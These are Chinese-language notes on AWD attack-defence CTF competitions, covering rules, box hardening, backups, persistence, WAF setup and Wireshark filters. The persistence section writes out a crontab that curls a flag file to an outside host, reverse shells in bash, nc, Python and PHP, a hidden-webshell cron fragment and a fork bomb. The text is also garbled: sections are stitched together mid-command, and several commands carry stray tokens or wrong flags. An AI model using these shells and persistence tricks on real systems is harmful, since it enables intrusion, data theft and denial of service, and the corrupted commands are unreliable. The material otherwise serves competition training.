# 比赛规则
  * 比赛：指从开始到结束的一整场比赛过程。
  * 轮：指一个单独的时间区间，分数计算的最小周期，一般为 10 分钟。 一场比赛由许多轮组成，可以理解为：`总轮数 = 比赛总时长 / 单轮时长`。
  * 选手：指比赛的参赛队伍，通常是一个 3-5 人的团队。
  * 题目：比赛的试题，对应着传统 Jeopardy 模式中的一道道题目。
  * 靶机：AWD 模式中，对于每一道题目，每个选手都会有一个自己的独立靶机，上面运行着这个题目的环境。
  * Check：为了检测选手的靶机服务以及功能是否能够正常运行，主办方会不定期运行 Check，（通常是一段自动请求并验证的脚本）用以检测服务可用性。检测到服务不可用，功能不全的靶机，其所属队伍将被扣分。（Check 的存在，是为了防止选手故意删站，或部署通防来使得攻击方无法对其靶机进行攻击，从而达到所谓“绝对的防御”）
  * 服务宕机 / CheckDown：指选手的靶机服务不可用，或功能不全。
# 常见awd思路
（当作参考）
## 1.靶机登陆
一般来说有两种登陆方式：
  * rsa公钥登陆
  * 用户名/密码登陆
使用xshell的话，那存在一个选择公钥的选项，可以直接登陆。
mobaxterm似乎是还要了解一下 ssh公钥登陆的命令
### 1.1 登陆后的思路
#### 1.1.1 修改默认密码
  * ssh是弱口令要记得修改密码
  * 如果又权限进入mysql，也需要修改密码
#### 1.1.2 信息备份
1.tar备份
    tar -zvxf /tmp/www.tar.gz /var/www/html/
scp备份
    scp -P ssh_port user@host_ip:/tmp/bak.sql local_filebash
修改源码的时候，可以利用vscode远程连接  
或者是利用vi
2.mysql备份
    //备份
    mysqldump -u user -p passwd database > 1.sql
    //还原
    mysql -u user -p passwd database  /var/www/html/.index.php\n* * * * * chmod 777 /var/www/html/.index.php" | crontab;whoami');
如果被种马了，怎么防御？
  * 杀进程后重启服务
  * 写一个同名的文件夹
  * 写一个sleep时间低于别人的马(或者写一个脚本不断删除别人的马)
#### 4.3.3 定时任务
  * 使用定时任务发送带有flag的请求
    bash# 编辑 crontab：crontab -e
    */5 * * * * curl 10.10.10.5:8000/submit_flag/ -d 'flag='$(cat /home/web/flag/flag)'&token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY'
    # 查询 crontab：crontab -l
  * 使用定时任务反弹shell
    * bash
    bash -c bash'bash -i >& /dev/tcp/[ip]/[port] 0>&1'
    nc -e /bin/bash 1.3.3.7 4444 bash
  * python
    python -c bash'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_REAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
  * php
    php -r bash'$sock=fsockopen("your_ip","4444");exec("/bin/sh -i &3 2>&3");'
如果因为定时任务一直失分咋办？
  * 杀进程（ps -ef / px -aux）
一般/bin/sh是nc服务
    kill `ps -aux | grep www-data | grep apache2 | awk '{print $2}'
如果是ctf权限的话，那只能写个马执行这个命令
#### 4.3.4 宕机
如果遇到不得不宕机的情况可以使用
    :(){:|:&};:
### 4.4 关于脚本
#### **4.4.1.上传waf**
check机制可能会check到waf过滤的参数，导致宕机（所以上床waf要慎重
    php.ini
    auto_prepend_file=waf.php;
    bash
    sudo find /var/www/html/ -bashtype f -path "*.php" | xargs sed -i "s/
    Options -ExecCGI -Indexes
    AllowOverride None
    RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
    RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml
    php_flag engine off
    deny from all
#### **4.4.2.主板方提供流量**
可以使用wireshark
基础用法：
  * 过滤IP地址
>   1. ip.addr == 192.168.1.1 //只显示源/目的IP为192.168.1.1的数据包
>   2. not ip.src == 1.1.1.1 //不显示源IP为1.1.1.1的数据包
>   3. ip.src == 1.1.1.1 or ip.dst == 1.1.1.2
> //只显示源IP为1.1.1.1或目的IP为1.1.1.2的数据包
>
  * 过滤端口
>   1. tcp.port eq 80 #不管端口是来源还是目的都显示80端口
>   2. tcp.port == 80
>   3. tcp.port eq 2722
>   4. tcp.port eq 80 or udp.port eq 80
>   5. tcp.dstport == 80 #只显示tcp协议的目标端口80
>   6. tcp.srcport == 80 #只显示tcp协议的来源端口80
>   7. udp.port eq 15000
>   8. tcp.port >= 1 and tcp.port 
  * 过滤MAC地址
>   1. eth.dst == MAC地址 #过滤目标MAC
>   2. eth.src eq MAC地址 #过滤来源MAC  
>  3.eth.addr eq MAC地址 #过滤来源MAC和目标MAC都等于MAC地址的
>
  * http请求方式过滤
>   1. http.request.method == “GET”  
>  2.http.request.method == “POST”  
>  3.http.host mathes
> “[www.baidu.com](http://www.baidu.com)|[http://baidu.cn](https://link.zhihu.com/?target=http%3A//baidu.cn)“
> #matches可以写多个域名
>   2. http.host contains
> “[http://www.baidu.com](https://link.zhihu.com/?target=http%3A//www.baidu.com)“
> #contain只能写一个域名